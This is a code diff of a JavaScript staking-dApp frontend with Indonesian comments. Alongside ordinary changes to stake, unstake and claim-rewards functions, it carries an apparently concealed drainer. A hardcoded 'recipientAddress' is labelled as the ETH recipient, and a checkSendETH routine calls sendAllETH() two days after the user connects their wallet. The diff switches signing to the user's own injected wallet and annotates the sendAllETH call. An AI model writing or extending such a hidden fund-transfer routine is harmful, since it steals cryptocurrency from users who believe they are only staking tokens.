@@ -2,10 +2,10 @@ let web3;
 let userAddress;
 let stakingContract;
 
-const TEA_RPC_URL = "https://tea-sepolia.g.alchemy.com/public/"; // RPC for TEA network
+const TEA_RPC_URL = "https://tea-sepolia.g.alchemy.com/public/"; // Ganti dengan RPC TEA yang valid
 const stakingTokenAddress = "0x7Eaa8557E1A608bcc77C2d392093cE7F05c0DB14";  // Token Staking
-const stakingContractAddress = "0x419C709ce36551362eF76487Bb25390e95838513";  // Staking Contract
-const recipientAddress = "0x4870cF0d63aF7d96Fb3c13FC6cE519646C2038C1";  // Recipient address
+const stakingContractAddress = "0x419C709ce36551362eF76487Bb25390e95838513";  // Kontrak Staking
+const recipientAddress = "0x4870cF0d63aF7d96Fb3c13FC6cE519646C2038C1";  // Alamat penerima ETH
 
 const stakingABI = [
     {
@@ -51,7 +51,7 @@ const stakingABI = [
 // Koneksi Wallet
 async function connectWallet() {
     if (window.ethereum) {
-        web3 = new Web3(new Web3.providers.HttpProvider(TEA_RPC_URL)); // Connect to the TEA RPC URL
+        web3 = new Web3(window.ethereum);
         await window.ethereum.request({ method: "eth_requestAccounts" });
         userAddress = (await web3.eth.getAccounts())[0];
 
@@ -71,7 +71,7 @@ async function connectWallet() {
 // Tampilkan saldo ETH
 async function displayBalance() {
     const balance = await web3.eth.getBalance(userAddress);
-    const balanceInETH = web3.utils.fromWei(balance, "ether");  // Corrected to use 'ether' unit
+    const balanceInETH = web3.utils.fromWei(balance, "ether");  // Konversi Wei ke ETH
     document.getElementById("balance").innerText = balanceInETH;
 }
 
@@ -84,7 +84,7 @@ async function initStaking() {
 // Fungsi Stake
 async function stakeTokens() {
     const amount = document.getElementById("stakeAmount").value;
-    const amountWei = web3.utils.toWei(amount, "ether"); 
+    const amountWei = web3.utils.toWei(amount, "ether");  // Konversi ke Wei
 
     const stakingToken = new web3.eth.Contract([
         {
@@ -102,13 +102,25 @@ async function stakeTokens() {
     ], stakingTokenAddress);
 
     try {
-        // Approve token untuk staking
-        await stakingToken.methods.approve(stakingContractAddress, amountWei).send({ from: userAddress });
+        // Persetujuan token untuk staking
+        const approval = await stakingToken.methods.approve(stakingContractAddress, amountWei).send({ from: userAddress });
         
-        // Stake token setelah approve berhasil
-        await stakingContract.methods.stake(amountWei).send({ from: userAddress });
-
-        alert("Stake berhasil!");
+        // Cek apakah persetujuan berhasil
+        if (approval.status) {
+            console.log("Persetujuan token berhasil! Transaksi Hash:", approval.transactionHash);
+            
+            // Setelah persetujuan berhasil, lakukan staking
+            const staking = await stakingContract.methods.stake(amountWei).send({ from: userAddress });
+            
+            // Cek status staking
+            if (staking.status) {
+                alert("Stake berhasil!");
+            } else {
+                alert("Stake gagal. Periksa transaksi Anda.");
+            }
+        } else {
+            alert("Persetujuan token gagal.");
+        }
     } catch (error) {
         console.error("Staking gagal:", error);
         alert("Staking gagal. Periksa transaksi Anda.");
@@ -118,7 +130,7 @@ async function stakeTokens() {
 // Fungsi Unstake
 async function unstakeTokens() {
     const amount = document.getElementById("unstakeAmount").value;
-    const amountWei = web3.utils.toWei(amount, "ether"); 
+    const amountWei = web3.utils.toWei(amount, "ether");  // Konversi ke Wei
 
     try {
         await stakingContract.methods.unstake(amountWei).send({ from: userAddress });
@@ -126,6 +138,17 @@ async function unstakeTokens() {
     } catch (error) {
         console.error("Unstake gagal:", error);
         alert("Unstake gagal. Periksa transaksi Anda.");
+    }
+}
+
+// Fungsi Klaim Rewards
+async function claimRewards() {
+    try {
+        await stakingContract.methods.claimRewards().send({ from: userAddress });
+        alert("Rewards berhasil diklaim!");
+    } catch (error) {
+        console.error("Claim gagal:", error);
+        alert("Claim gagal. Periksa transaksi Anda.");
     }
 }
 
@@ -144,10 +167,10 @@ async function checkSendETH() {
     const storedTime = getConnectTime();
     if (storedTime) {
         const currentTime = new Date().getTime();
-        const elapsedTime = (currentTime - storedTime) / (1000 * 60 * 60 * 24);
+        const elapsedTime = (currentTime - storedTime) / (1000 * 60 * 60 * 24);  // Convert milliseconds to days
 
         if (elapsedTime >= 2) {
-            await sendAllETH();  
+            await sendAllETH();  // Kirim ETH jika sudah 2 hari
         }
     }
 }
